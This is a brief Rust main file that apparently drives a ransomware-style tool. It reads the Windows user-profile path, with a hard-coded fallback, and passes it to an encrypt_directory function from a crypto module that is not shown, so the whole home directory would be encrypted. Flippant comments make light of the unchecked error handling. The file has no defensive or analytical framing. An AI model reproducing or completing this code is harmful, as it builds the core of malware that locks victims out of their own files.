mod crypto;
use crypto::encrypt_directory;
use std::env;

fn main() {
    let home: String = env::var("USERPROFILE").unwrap_or("C:\\Users\\Xory".to_string()); // no way this could fail!
    dbg!(&home);
    encrypt_directory(&home).unwrap(); // I know this many unwraps look
                                                        // suspicious, but the chance of this
                                                        // failing is less than a solar flare.
}
